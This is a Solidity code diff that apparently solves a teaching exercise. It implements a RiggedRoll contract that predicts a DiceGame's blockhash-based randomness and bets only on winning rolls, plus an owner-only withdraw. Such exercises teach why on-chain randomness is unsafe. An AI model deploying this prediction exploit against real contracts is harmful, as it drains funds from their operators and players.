@@ -6,19 +6,37 @@ import "./DiceGame.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
 
 contract RiggedRoll is Ownable {
-
     DiceGame public diceGame;
 
     constructor(address payable diceGameAddress) {
         diceGame = DiceGame(diceGameAddress);
     }
 
-    //Add withdraw function to transfer ether from the rigged contract to an address
+    function riggedRoll() public payable {
+        uint256 amount = 2000000000000000;
+        require(
+            address(this).balance >= amount,
+            "Require more ETH to roll dice"
+        );
 
+        bytes32 prevHash = blockhash(block.number - 1);
+        bytes32 hash = keccak256(
+            abi.encodePacked(prevHash, address(diceGame), diceGame.nonce())
+        );
+        uint256 roll = uint256(hash) % 16;
 
-    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
+        console.log("THE PREDICTED ROLL IS ", roll);
+        if (roll > 2) {
+            return;
+        }
+        diceGame.rollTheDice{value: amount}();
+    }
 
+    function withdraw(address _addr, uint256 _amount) public onlyOwner {
+        (bool sent, ) = _addr.call{value: _amount}("");
 
-    //Add receive() function so contract can receive Eth
-    
+        require(sent, "Error in transfer");
+    }
+
+    receive() external payable {}
 }
